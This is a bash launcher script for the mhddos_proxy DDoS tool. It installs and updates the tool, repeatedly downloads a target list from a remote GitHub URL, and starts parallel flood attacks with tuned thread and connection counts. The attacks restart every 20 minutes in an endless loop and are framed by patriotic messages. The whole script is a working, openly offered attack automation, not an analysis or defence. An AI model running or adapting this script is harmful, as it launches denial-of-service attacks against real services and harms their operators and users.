#!/bin/bash

#Just in case kill previous copy of mhddos_proxy
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
	sudo pkill -e -f runner.py
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mThere are no more old processes with MHDDoS! Yay! ^_^\033[0;0m\n"
#...
#Begin of latest updates
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest updates...\033[0;0m\n"
	sleep 3s
	sudo apt update -y &&  sudo apt upgrade -y
	#Find outdated pip packages and update it
	pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip install -U
	cd ~
		sudo rm -rf mhddos_proxy
		git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
#End of latest updates
#...
#Begin of latest requirements for tools
echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
	cd ~/mhddos_proxy
		python3 -m pip install -r requirements.txt
	cd ~
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mRequirements installed successfully\033[1;0m\n\n"
#End of latest requirements for tools
#...
#Setting interval and chown directories
restart_interval="20m"
	sudo chown -R ${USER}:${USER} ~/auto_mhddos_alexnest_lite
	sudo chown -R ${USER}:${USER} /home/${USER}/auto_mhddos_alexnest_lite
	sudo chown -R ${USER}:${USER} ~/mhddos_proxy
	sudo chown -R ${USER}:${USER} /home/${USER}/mhddos_proxy
	sudo git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest_lite
	sudo git config --global --add safe.directory /home/${USER}/mhddos_proxy
#Done
#...
#Checking settings...
#Number of copies (independed)
num_of_copies="${1:-1}"
if [[ "$num_of_copies" == "all" ]];
then	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
	num_of_copies=3
elif ((num_of_copies > 3));
then 
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
	num_of_copies=3
elif ((num_of_copies < 1));
then
	num_of_copies=1
elif ((num_of_copies != 1 && num_of_copies != 2 && num_of_copies != 3));
then
	num_of_copies=1
fi
#Number of threads
threads="${2:-1500}"
if ((threads < 500));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with minimum effective settings - 500 threads\033[0;0m\n"
	threads=500
elif ((threads > 50000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with safe settings - 5000 threads\033[0;0m\n"
	threads=5000
fi
#Number of requests per connection (RPC)
rpc="${3:-1000}"
if ((rpc < 1000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too LOW amount of rpc(connections) - attack will be started with 1000 rpc\033[0;0m\n"
	rpc=1000
elif ((rpc > 15000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 5000 rpc\033[0;0m\n"
	rpc=5000
fi
#Number of copies to attack SAME list of target (upd 25.05.2022)
copies_num_sametargets="${4:-1}"
if [[ "$copies_num_sametargets" == "all" ]];
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with standard settings of copies - ONE MHDDoS attack $num_of_copies list(s) of targets\033[0;0m\n"
	copies_num_sametargets=1
elif ((copies_num_sametargets > 10));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with safe settings of copies - 2x MHDDoS attack $num_of_copies list(s) of targets\033[0;0m\n"
	copies_num_sametargets=2
elif ((copies_num_sametargets < 1));
then
	copies_num_sametargets=1
fi
#...
rand=3
#...
#Correcting settings for slow machines for safe start
proc_num=$(nproc --all)
if ((proc_num < 2));
then
	if ((threads > 10000));
	then
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for 1-core CPU - attack will be started with 4000 threads\033[0;0m\n"
		threads=4000
	fi
	if ((copies_num_sametargets > 6));
	then
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$copies_num_sametargets is too HIGH for effective attack on 1-core CPU - attack will be started with ONE copy (but multiply targets)\033[0;0m\n"
		copies_num_sametargets=2
	fi
	if ((num_of_copies > 6));
	then
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$num_of_copies is too HIGH for effective attack on 1-core CPU - attack will be started with ONE copy (but multiply targets)\033[0;0m\n"
		num_of_copies=2
	fi
fi
sleep 5s
# Restarts attacks and update targets list every 20 minutes
while [ 1 == 1 ]
do	
	cd ~/mhddos_proxy
	num0=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo "$num0"
   	if ((num0 == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
	else
		python3 -m pip install -r requirements.txt
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
		sleep 2s
	fi
	cd ~/auto_mhddos_alexnest_lite
   	num=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo "$num"
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest_lite"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest_lite"
		bash runner.sh $num_of_copies $threads $rpc $copies_num_sametargets # run new downloaded script 
	fi
   	sleep 3s
	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
	if ((num_of_copies > list_size));
	then 
		random_numbers=$(shuf -i 1-$list_size -n $list_size)
	else
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	fi
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting $copies_num_sametargets simultaneous attack(s) with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc ...\033[1;0m"
	sleep 3s
	# Launch multiple mhddos_proxy instances with different targets.
   		for i in $random_numbers
   		do
            		echo -e "\n I = $i"
             		# Filter and only get lines that not start with "#". Then get one target from that filtered list.
            		cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
                	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn --copies $copies_num_sametargets"
            		cd ~/mhddos_proxy
            		python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn --copies $copies_num_sametargets
	    		sleep 20s
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully! Glory to Ukraine!\033[0m\n"
		done
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
	sleep 5s
	sleep $restart_interval
	clear
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
   	sudo pkill -e -f runner.py
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mThere are no more old processes with MHDDoS! Yay! ^_^\033[0;0m\n"
   	no_ddos_sleep="$(shuf -i 1-3 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
done
